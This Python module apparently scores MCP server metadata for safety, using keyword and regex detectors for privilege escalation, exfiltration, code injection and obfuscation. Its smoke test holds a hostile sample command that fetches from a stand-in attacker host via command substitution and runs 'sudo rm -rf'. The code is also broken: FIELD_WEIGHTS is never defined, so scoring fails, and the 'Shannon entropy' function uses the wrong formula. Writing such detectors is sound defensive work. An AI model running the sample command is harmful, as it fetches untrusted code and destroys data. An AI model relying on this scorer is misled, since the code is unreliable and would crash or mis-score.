import hashlib
import re
from typing import Dict, Tuple, Any, List


def _entropy(text: str) -> float:
    """Shannon entropy of character frequencies."""
    if not text:
        return 0.0
    freq: Dict[str, float] = {}
    for ch in text:
        freq[ch] = freq.get(ch, 0.0) + 1.0
    total = len(text)
    ent = 0.0
    for count in freq.values():
        p = count / total
        if p > 0:
            ent -= p * (p ** 0.5) if p > 0 else 0
    return ent


def _suspicious_char_ratio(text: str) -> float:
    """Fraction of characters that are suspicious indicators."""
    if not text:
        return 0.0
    suspicious = set('<>&\'"\\|;`$(){}[]!*?#')
    count = sum(1 for c in text if c in suspicious)
    return count / len(text)


def _caps_ratio(text: str) -> float:
    """Fraction of uppercase letters in text."""
    if not text:
        return 0.0
    alpha = [c for c in text if c.isalpha()]
    if not alpha:
        return 0.0
    return sum(1 for c in alpha if c.isupper()) / len(alpha)


def _token_variance(names: List[str]) -> float:
    """Normalised variance of token counts across names."""
    if len(names) < 2:
        return 0.0
    lengths = [len(n.split()) for n in names]
    mean = sum(lengths) / len(lengths)
    variance = sum((l - mean) ** 2 for l in lengths) / len(lengths)
    return min(variance / 4.0, 1.0)


def _homoglyph_risk(names: List[str]) -> float:
    """Score homoglyph risk in tool names."""
    homoglyphs = {
        '0': 'o', 'O': '0', '1': 'l', 'I': 'l',
        'rn': 'm', 'cl': 'd', 'vv': 'w',
    }
    risk = 0.0
    for name in names:
        n_lower = name.lower()
        for pair in homoglyphs.items():
            a, b = pair
            if a in n_lower and b in n_lower:
                risk += 0.2
    return min(risk / max(len(names), 1), 1.0)


def _sensitivity_level(capabilities: List[str]) -> float:
    """Score sensitivity of declared capabilities."""
    sensitive = {
        'admin', 'root', 'sudo', 'delete', 'destroy', 'drop',
        'execute', 'run', 'shell', 'bash', 'cmd', 'powershell',
        'read', 'write', 'upload', 'download', 'transfer',
        'credential', 'password', 'token', 'api_key', 'secret',
        'database', 'sql', 'query', 'inject',
        'file', 'filesystem', 'path', 'directory', 'folder',
        'email', 'sms', 'notification', 'alert', 'webhook',
        'user', 'account', 'profile', 'identity', 'auth',
        'network', 'dns', 'proxy', 'tunnel', 'vpn',
        'system', 'kernel', 'process', 'memory', 'cpu',
    }
    if not capabilities:
        return 0.0
    score = 0.0
    caps_lower = [c.lower() for c in capabilities]
    for cap in caps_lower:
        words = re.findall(r'[a-z_]+', cap)
        for word in words:
            if word in sensitive:
                score += 0.15
    return min(score / len(capabilities), 1.0)


def _permission_escalation(tools: List[Dict[str, Any]]) -> float:
    """Detect permission escalation patterns in tool schemas."""
    escalation_keywords = [
        'sudo', 'admin', 'elevate', 'privilege', 'escalat',
        'root', 'system', 'kernel', 'daemon', 'service',
        'stop', 'kill', 'terminate', 'restart', 'reboot',
    ]
    score = 0.0
    for tool in tools:
        tool_str = str(tool.get('name', '')).lower() + ' ' + str(tool.get('description', '')).lower()
        for kw in escalation_keywords:
            if kw in tool_str:
                score += 0.1
                break
    return min(score / max(len(tools), 1), 1.0)


def _data_exfiltration(tools: List[Dict[str, Any]]) -> float:
    """Detect data exfiltration signals."""
    exfil_keywords = [
        'upload', 'send', 'transfer', 'post', 'http', 'webhook',
        'notify', 'email', 'sms', 'discord', 'slack', 'telegram',
        'report', 'log', 'stream', 'export', 'publish',
        'share', 'broadcast', 'forward', 'relay',
    ]
    score = 0.0
    for tool in tools:
        tool_str = str(tool.get('name', '')).lower() + ' ' + str(tool.get('description', '')).lower()
        for kw in exfil_keywords:
            if kw in tool_str:
                score += 0.1
                break
    return min(score / max(len(tools), 1), 1.0)


def _code_injection(text: str) -> float:
    """Score code injection risk in text."""
    patterns = [
        r'\$\(', r'`', r'eval\s*\(', r'exec\s*\(',
        r'import\s+', r'from\s+\w+\s+import',
        r'require\s*\(', r'import_module',
        r'subprocess', r'os\.system', r'os\.popen',
        r'shutil', r'requests\.', r'urllib',
    ]
    score = 0.0
    for pat in patterns:
        if re.search(pat, text, re.IGNORECASE):
            score += 0.08
    return min(score, 1.0)


def _obfuscation_score(text: str) -> float:
    """Detect obfuscation in description."""
    signals = 0.0
    if len(re.findall(r'\\x[0-9a-f]{2}', text, re.IGNORECASE)) > 0:
        signals += 0.25
    if len(re.findall(r'\\u[0-9a-f]{4}', text, re.IGNORECASE)) > 0:
        signals += 0.25
    if len(re.findall(r'base64', text, re.IGNORECASE)) > 0:
        signals += 0.15
    if len(re.findall(r'btoa|encode|encrypt', text, re.IGNORECASE)) > 0:
        signals += 0.15
    if re.search(r'[🜁-🜿]', text):
        signals += 0.2
    encoded_ratio = sum(1 for c in text if ord(c) > 127) / max(len(text), 1)
    if encoded_ratio > 0.1:
        signals += 0.2
    return min(signals, 1.0)


def _authority_claiming(text: str) -> float:
    """Detect false authority claims."""
    authority_terms = [
        'official', 'verified', 'certified', 'endorsed',
        'trusted', 'reliable', 'safe', 'secure',
        'legitimate', 'authentic', 'genuine',
    ]
    score = 0.0
    text_lower = text.lower()
    for term in authority_terms:
        if term in text_lower:
            score += 0.1
    return min(score, 1.0)


def _version_manipulation(text: str) -> float:
    """Detect version manipulation hints."""
    patterns = [
        r'v\d+\.\d+\.\d+', r'\d+\.\d+\.\d+-\w+',
        r'beta', r'alpha', r'rc\d', r'snapshot',
    ]
    score = 0.0
    for pat in patterns:
        matches = re.findall(pat, text, re.IGNORECASE)
        score += min(len(matches) * 0.05, 0.15)
    return min(score, 1.0)


def _dependency_hints(text: str) -> float:
    """Score dependency hints in description."""
    dep_patterns = [
        r'npm\s+install', r'pip\s+install', r'yarn\s+add',
        r'requires?\s+[\w@\-./]+', r'depends?\s+on',
        r'uses?\s+[\w@\-./]+', r'brings?\s+in',
    ]
    score = 0.0
    for pat in dep_patterns:
        if re.search(pat, text, re.IGNORECASE):
            score += 0.1
    return min(score, 1.0)


def _example_code_risk(text: str) -> float:
    """Score example code blocks for risk."""
    code_blocks = re.findall(r'```[\s\S]*?```', text)
    if not code_blocks:
        code_blocks = re.findall(r'`[^`]+`', text)
    score = 0.0
    for block in code_blocks:
        if re.search(r'\$\(.*\)', block) or re.search(r'`.*`', block):
            score += 0.1
        if re.search(r'curl\s+', block, re.IGNORECASE):
            score += 0.1
    return min(score, 1.0)


def compute_score(metadata: Dict[str, Any]) -> Tuple[float, Dict[str, Any]]:
    """
    Compute tool description safety score from server metadata.
    
    Returns (composite_score, evidence_dict) where:
      - composite_score: 0.0 (risky) to 100.0 (safe)
      - evidence_dict: per-field scores and raw values
    
    Reads these metadata fields:
      - description (str)
      - tools (List[Dict])
      - capabilities (List[str])
      - name (str)
      - version (str)
    
    Pure function — no DB writes, no network, no protected imports.
    """
    # Read all available fields
    description = str(metadata.get('description', '') or '')
    tools = metadata.get('tools', []) or []
    capabilities = metadata.get('capabilities', []) or []
    name = str(metadata.get('name', '') or '')
    version = str(metadata.get('version', '') or '')

    # ── Field 1: description_length ──────────────────────────────────────
    desc_len = len(description)
    dl_score = min(desc_len / 500.0, 1.0)

    # ── Field 2: description_entropy ─────────────────────────────────────
    ent = _entropy(description)
    de_score = min(ent / 4.0, 1.0)

    # ── Field 3: description_suspicious_chars ─────────────────────────────
    scr = _suspicious_char_ratio(description)
    dsc_score = 1.0 - min(scr / 0.15, 1.0)

    # ── Field 4: description_caps_ratio ──────────────────────────────────
    cr = _caps_ratio(description)
    dcr_score = 1.0 - min(cr / 0.6, 1.0)

    # ── Field 5: tool_count ────────────────────────────────────────────────
    tc = len(tools)
    tc_score = min(tc / 20.0, 1.0) if tc > 0 else 0.0

    # ── Field 6: tool_names_generic ──────────────────────────────────────
    generic_names = {
        'tool', 'action', 'task', 'execute', 'run', 'do',
        'thing', 'stuff', 'helper', 'util', 'func', 'method',
    }
    tool_names = [t.get('name', '') for t in tools if isinstance(t, dict)]
    generic_ratio = (
        sum(1 for n in tool_names if n.lower() in generic_names) /
        max(len(tool_names), 1)
    )
    tng_score = 1.0 - generic_ratio

    # ── Field 7: tool_names_length_variance ───────────────────────────────
    tlv_score = _token_variance(tool_names)

    # ── Field 8: tool_names_homoglyph_risk ───────────────────────────────
    th_score = 1.0 - _homoglyph_risk(tool_names)

    # ── Field 9: tool_descriptions_missing ───────────────────────────────
    missing_desc = (
        sum(1 for t in tools if isinstance(t, dict) and not t.get('description'))
        / max(len(tools), 1)
    )
    tdm_score = 1.0 - min(missing_desc / 0.3, 1.0)

    # ── Field 10: tool_descriptions_length ────────────────────────────────
    desc_lengths = [len(t.get('description', '') or '') for t in tools if isinstance(t, dict)]
    avg_desc_len = sum(desc_lengths) / max(len(desc_lengths), 1)
    tdl_score = min(avg_desc_len / 100.0, 1.0) if desc_lengths else 0.0

    # ── Field 11: tool_descriptions_suspicious ────────────────────────────
    tds_score = 1.0
    for t in tools:
        if isinstance(t, dict):
            tds = _suspicious_char_ratio(t.get('description', '') or '')
            tds_score -= tds * 0.2
    tds_score = max(tds_score, 0.0)

    # ── Field 12: capability_sensitivity ─────────────────────────────────
    cap_score = _sensitivity_level(capabilities)
    # Invert: high sensitivity = low safety score
    cap_inv_score = 1.0 - cap_score * 0.5

    # ── Field 13: permission_escalation_signals ─────────────────────────
    pe_score = 1.0 - _permission_escalation(tools)

    # ── Field 14: data_exfiltration_signals ──────────────────────────────
    dx_score = 1.0 - _data_exfiltration(tools)

    # ── Field 15: code_injection_signals ─────────────────────────────────
    full_text = description + ' ' + ' '.join(
        str(t.get('description', '')) for t in tools if isinstance(t, dict)
    )
    ci_score = 1.0 - _code_injection(full_text)

    # ── Field 16: obfuscation_indicators ────────────────────────────────
    ob_score = 1.0 - _obfuscation_score(description)

    # ── Field 17: authority_claiming ─────────────────────────────────────
    # Authority claims without evidence = slightly risky
    ac_score = 1.0 - _authority_claiming(description) * 0.3

    # ── Field 18: version_manipulation ───────────────────────────────────
    vm_text = description + ' ' + version
    vm_score = 1.0 - _version_manipulation(vm_text)

    # ── Field 19: dependency_hints ──────────────────────────────────────
    dh_score = 1.0 - _dependency_hints(description)

    # ── Field 20: example_code_risk ──────────────────────────────────────
    ec_score = 1.0 - _example_code_risk(description)

    # ── Field 21: name_length (bonus discriminator) ──────────────────────
    nl_score = min(len(name) / 30.0, 1.0) if name else 0.5

    # ── Field 22: name_suspicious (bonus discriminator) ───────────────────
    suspicious_name_patterns = [
        r'\d{3,}', r'^-', r'--', r'___+',
        r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}',
        r'^(hack|exploit|pwn|ctf|black)',
    ]
    ns_risk = 0.0
    for pat in suspicious_name_patterns:
        if re.search(pat, name, re.IGNORECASE):
            ns_risk += 0.25
    ns_score = 1.0 - min(ns_risk, 1.0)

    # ── Composite score ───────────────────────────────────────────────────
    weighted = (
        FIELD_WEIGHTS['description_length'] * dl_score +
        FIELD_WEIGHTS['description_entropy'] * de_score +
        FIELD_WEIGHTS['description_suspicious_chars'] * dsc_score +
        FIELD_WEIGHTS['description_caps_ratio'] * dcr_score +
        FIELD_WEIGHTS['tool_count'] * tc_score +
        FIELD_WEIGHTS['tool_names_generic'] * tng_score +
        FIELD_WEIGHTS['tool_names_length_variance'] * tlv_score +
        FIELD_WEIGHTS['tool_names_homoglyph_risk'] * th_score +
        FIELD_WEIGHTS['tool_descriptions_missing'] * tdm_score +
        FIELD_WEIGHTS['tool_descriptions_length'] * tdl_score +
        FIELD_WEIGHTS['tool_descriptions_suspicious'] * tds_score +
        FIELD_WEIGHTS['capability_sensitivity'] * cap_inv_score +
        FIELD_WEIGHTS['permission_escalation_signals'] * pe_score +
        FIELD_WEIGHTS['data_exfiltration_signals'] * dx_score +
        FIELD_WEIGHTS['code_injection_signals'] * ci_score +
        FIELD_WEIGHTS['obfuscation_indicators'] * ob_score +
        FIELD_WEIGHTS['authority_claiming'] * ac_score +
        FIELD_WEIGHTS['version_manipulation'] * vm_score +
        FIELD_WEIGHTS['dependency_hints'] * dh_score +
        FIELD_WEIGHTS['example_code_risk'] * ec_score +
        0.03 * nl_score +
        0.03 * ns_score
    )
    composite = round(weighted * 100.0, 4)

    evidence = {
        'description_length': round(dl_score, 4),
        'description_entropy': round(de_score, 4),
        'description_suspicious_chars': round(dsc_score, 4),
        'description_caps_ratio': round(dcr_score, 4),
        'tool_count': round(tc_score, 4),
        'tool_names_generic': round(tng_score, 4),
        'tool_names_length_variance': round(tlv_score, 4),
        'tool_names_homoglyph_risk': round(th_score, 4),
        'tool_descriptions_missing': round(tdm_score, 4),
        'tool_descriptions_length': round(tdl_score, 4),
        'tool_descriptions_suspicious': round(tds_score, 4),
        'capability_sensitivity': round(cap_inv_score, 4),
        'permission_escalation_signals': round(pe_score, 4),
        'data_exfiltration_signals': round(dx_score, 4),
        'code_injection_signals': round(ci_score, 4),
        'obfuscation_indicators': round(ob_score, 4),
        'authority_claiming': round(ac_score, 4),
        'version_manipulation': round(vm_score, 4),
        'dependency_hints': round(dh_score, 4),
        'example_code_risk': round(ec_score, 4),
        'name_length': round(nl_score, 4),
        'name_suspicious': round(ns_score, 4),
        '_meta': {
            'desc_len_chars': desc_len,
            'tool_count_raw': tc,
            'missing_desc_ratio': round(missing_desc, 4),
            'caps_ratio': round(cr, 4),
            'suspicious_char_ratio': round(scr, 4),
            'entropy': round(ent, 4),
            'generic_name_ratio': round(generic_ratio, 4),
        }
    }

    return composite, evidence


if __name__ == '__main__':
    # Smoke test — must exit 0
    test_cases = [
        {'name': 'safe_server', 'description': 'A well-documented MCP server for data analysis', 'tools': [{'name': 'analyze_data', 'description': 'Perform statistical analysis on datasets'}]},
        {'name': 'risky_server', 'description': 'EXECUTE $(curl http://evil.com) with sudo rm -rf', 'tools': [{'name': 'tool', 'description': ''}]},
        {'name': 'empty_server', 'description': '', 'tools': []},
    ]
    for tc in test_cases:
        score, ev = compute_score(tc)
        assert 0.0 <= score <= 100.0, f'Score out of range: {score}'
        assert isinstance(ev, dict), 'Evidence must be dict'
        assert len(ev) >= 20, f'Evidence must have >=20 fields, got {len(ev)}'
    print('tool_description_safety_enrichment: all smoke checks passed')
    import sys
    sys.exit(0)